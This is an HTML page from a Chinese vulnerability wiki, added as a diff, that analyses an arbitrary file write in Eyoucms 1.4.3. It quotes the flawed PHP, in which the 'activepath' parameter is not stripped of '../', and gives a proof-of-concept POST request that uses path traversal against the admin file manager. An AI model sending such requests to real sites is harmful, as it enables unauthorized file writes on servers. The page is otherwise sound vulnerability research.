@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Eyoucms 1.4.3 任意文件写入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Eyoucms 1.4.3 \u4efb\u610f\u6587\u4ef6\u5199\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 csrf漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="eyoucms-143">Eyoucms 1.4.3 任意文件写入<a class="headerlink" href="#eyoucms-143" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>可写入html,css,js,txt文件，总体来说比较鸡肋。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Eyoucms 1.4.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞点只对<code>filename</code>进行过滤，而忘了<code>activepath</code>也可以<code>../</code>进行跳转
+<code>application/admin/controller/Filemanager.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">IS_POST</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">         </span><span class="err">$</span><span class="n">post</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s">&#39;post.&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">);</span>
+<span class="w">         </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s">&#39;post.content&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">);</span>
+<span class="w">         </span><span class="err">$</span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="s">&#39;filename&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kr">trim</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="s">&#39;filename&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+<span class="w">         </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+<span class="w">         </span><span class="err">$</span><span class="n">activepath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="s">&#39;activepath&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kr">trim</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="s">&#39;activepath&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+
+<span class="w">             </span><span class="p">...</span><span class="w"> </span><span class="p">...</span>
+
+<span class="w">         </span><span class="err">$</span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">filemanagerLogic</span><span class="o">-&gt;</span><span class="n">editFile</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">activepath</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="p">);</span>
+<span class="w">         </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">r</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kr">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="kr">success</span><span class="p">(</span><span class="s">&#39;操作成功！&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">(</span><span class="s">&#39;Filemanager/index&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;activepath&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">filemanagerLogic</span><span class="o">-&gt;</span><span class="n">replace_path</span><span class="p">(</span><span class="err">$</span><span class="n">activepath</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;:&#39;</span><span class="p">,</span><span class="w"> </span><span class="kr">false</span><span class="p">))));</span>
+<span class="w">             </span><span class="n">exit</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="p">...</span><span class="w"> </span><span class="p">...</span>
+</code></pre></div>
+
+<p>跟进<code>editFile</code>函数</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">application</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">logic</span><span class="o">/</span><span class="nx">FilemanagerLogic</span><span class="p">.</span><span class="nx">php</span>
+<span class="w"> </span><span class="nx">public</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">editFile</span><span class="p">(</span><span class="err">$</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">activepath</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">)</span>
+<span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="err">$</span><span class="nx">fileinfo</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">pathinfo</span><span class="p">(</span><span class="err">$</span><span class="nx">filename</span><span class="p">);</span><span class="c1">// pathinfo获取后缀</span>
+<span class="w">     </span><span class="err">$</span><span class="nx">ext</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strtolower</span><span class="p">(</span><span class="err">$</span><span class="nx">fileinfo</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">extension</span><span class="err">&#39;</span><span class="p">]);</span>
+
+<span class="w">     </span><span class="o">......</span>
+
+<span class="w">     </span><span class="cm">/*允许编辑的文件类型*/</span>
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(!</span><span class="nx">in_array</span><span class="p">(</span><span class="err">$</span><span class="nx">ext</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">editExt</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//&lt;&lt;&lt;&lt;&lt;基于白名单，暂时没有想到绕过的方法&gt;&gt;&gt;&gt;&gt;</span>
+<span class="w">         </span><span class="k">return</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">只允许操作文件类型如下</span><span class="err">：&#39;</span><span class="p">.</span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;|&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">editExt</span><span class="p">);</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="cm">/*--end*/</span>
+
+<span class="w">     </span><span class="err">$</span><span class="nx">filename</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">str_replace</span><span class="p">(</span><span class="s">&quot;..&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">filename</span><span class="p">);</span><span class="c1">// 仅对filename进行过滤</span>
+<span class="w">     </span><span class="err">$</span><span class="nx">file</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">baseDir</span><span class="p">.</span><span class="s">&quot;$activepath/$filename&quot;</span><span class="p">;</span><span class="w"> </span><span class="c1">// 此处直接拼接产生漏洞</span>
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(!</span><span class="nx">is_writable</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="err">$</span><span class="nx">file</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">         </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;请把模板文件目录设置为可写入权限！&quot;</span><span class="p">;</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="nx">css</span><span class="err">&#39;</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="err">$</span><span class="nx">ext</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">         </span><span class="err">$</span><span class="nx">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="err">$</span><span class="nx">content</span><span class="p">,</span><span class="w"> </span><span class="nx">ENT_QUOTES</span><span class="p">);</span>
+<span class="w">         </span><span class="err">$</span><span class="nx">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">preg_replace</span><span class="p">(</span><span class="s">&quot;/(@)?eval(\s*)\(/i&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">intval</span><span class="p">(</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">content</span><span class="p">);</span><span class="c1">//</span>
+<span class="w">         </span><span class="c1">// $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;？ｍｕｍａ&quot;, $content);</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="err">$</span><span class="nx">fp</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">fopen</span><span class="p">(</span><span class="err">$</span><span class="nx">file</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">);</span>
+<span class="w">     </span><span class="nx">fputs</span><span class="p">(</span><span class="err">$</span><span class="nx">fp</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">content</span><span class="p">);</span>
+<span class="w">     </span><span class="nx">fclose</span><span class="p">(</span><span class="err">$</span><span class="nx">fp</span><span class="p">);</span>
+<span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">eyoucms</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">Filemanager</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">newfile</span><span class="o">&amp;</span><span class="n">lang</span><span class="o">=</span><span class="n">cn</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="w"> </span><span class="n">Host</span><span class="p">:</span><span class="w"> </span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+<span class="w"> </span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">X11</span><span class="p">;</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">i686</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">67.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">67.0</span>
+<span class="w"> </span><span class="n">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="w"> </span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+<span class="w"> </span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="w"> </span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="w"> </span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">94</span>
+<span class="w"> </span><span class="n">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+<span class="w"> </span><span class="n">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="w"> </span><span class="n">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">eyoucms</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">Filemanager</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">newfile</span><span class="o">&amp;</span><span class="n">activepath</span><span class="o">=%</span><span class="mi">3</span><span class="n">Atemplate</span><span class="o">%</span><span class="mi">3</span><span class="n">Aplugins</span><span class="o">%</span><span class="mi">3</span><span class="n">Atest</span><span class="o">&amp;</span><span class="n">lang</span><span class="o">=</span><span class="n">cn</span>
+<span class="w"> </span><span class="n">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">home_lang</span><span class="o">=</span><span class="n">cn</span><span class="p">;</span><span class="w"> </span><span class="n">admin_lang</span><span class="o">=</span><span class="n">cn</span><span class="p">;</span><span class="w"> </span><span class="n">PHPSESSID</span><span class="o">=</span><span class="n">h6k34lgf1svcatllongehqqdt0</span><span class="p">;</span><span class="w"> </span><span class="n">workspaceParam</span><span class="o">=</span><span class="n">index</span><span class="o">%</span><span class="mi">7</span><span class="n">CFilemanager</span><span class="p">;</span><span class="w"> </span><span class="n">XDEBUG_SESSION</span><span class="o">=</span><span class="mi">18705</span>
+<span class="w"> </span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+
+<span class="w"> </span><span class="n">activepath</span><span class="o">=%</span><span class="mi">2</span><span class="n">Ftemplate</span><span class="o">%</span><span class="mi">2</span><span class="n">Fplugins</span><span class="o">%</span><span class="mi">2</span><span class="n">Ftest</span><span class="o">/../../../</span><span class="n">uploads</span><span class="o">/</span><span class="n">tmp</span><span class="o">&amp;</span><span class="n">filename</span><span class="o">=</span><span class="n">newfile</span><span class="o">.</span><span class="n">htm</span><span class="o">&amp;</span><span class="n">content</span><span class="o">=</span><span class="n">test</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 csrf漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
